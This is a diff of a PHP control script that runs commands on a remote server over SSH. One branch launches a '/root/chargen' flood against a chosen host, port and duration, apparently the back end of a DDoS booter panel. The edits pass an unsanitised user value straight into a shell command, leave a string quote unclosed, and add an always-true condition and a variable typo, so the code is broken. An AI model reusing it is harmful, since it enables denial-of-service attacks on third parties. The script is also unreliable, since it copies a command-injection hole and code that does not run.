@@ -25,7 +25,7 @@ else
     {
     	if($cmd == "start" || $cmd == "start")
     	{
-	        if(!($stream = ssh2_exec($con, "screen -dmS ".$name." ".$commandstart))) die("Command couldn't be executed, something went wrong...\n");
+	        if(!($stream = ssh2_exec($con, "screen -dmS $name $commandstart))) die("Command couldn't be executed, something went wrong...\n");
 	        else
 	        {
 	            echo "" . stream_get_contents($stream);
@@ -34,14 +34,14 @@ else
 	    }
 	    elseif($cmd == "stop" || $cmd == "stop")
     	{
-	        if(!($stream = ssh2_exec($con, "screen -S ".$name." -p 0 -X stuff stop"))) die("Command couldn't be executed, something went wrong...\n");
+	        if(!($stream = ssh2_exec($con, "screen -S $name -p 0 -X stuff stop"))) die("Command couldn't be executed, something went wrong...\n");
 	        else
 	        {
 	            echo "" . stream_get_contents($stream);
 	            echo "Stop Server : Success";
 	        }
 	    }
-	    elseif($cmd == "cmd" || $cmd == "cmd")
+	    elseif($cmd == "restart" || $cmd == "restart")
     	{
 	        if(!($stream = ssh2_exec($con, "/root/chargen ".$host." ".$port." ".$list." ".ATTACK_THREADS." ".$time))) die("Command couldn't be executed, something went wrong...\n");
 	        else
@@ -50,13 +50,13 @@ else
 	            echo "ATTACK : $hot PORT : $port TIME : $time METHOD : $method";
 	        }
 	    }
-	    elseif($cmd == "kuy" || $method == "kuy")
+	    elseif($cmd == $cmd || $cmd == $cmd)
     	{
-	        if(!($stream = ssh2_exec($con, "screen -s root -X quit"))) die("Command couldn't be executed, something went wrong...\n");
+	        if(!($stream = ssh2_exec($con, "screen -S $name -p 0 -X stuff ".$cmd\n))) die("Command couldn't be executed, something went wrong...\n");
 	        else
 	        {
 	            echo "" . stream_get_contents($stream);
-	            echo "STOP : ALL SUCCESS";
+	            echo "Send CMD SUCCESS";
 	        }
 	    }
 	    else die("Please Choose Method!");
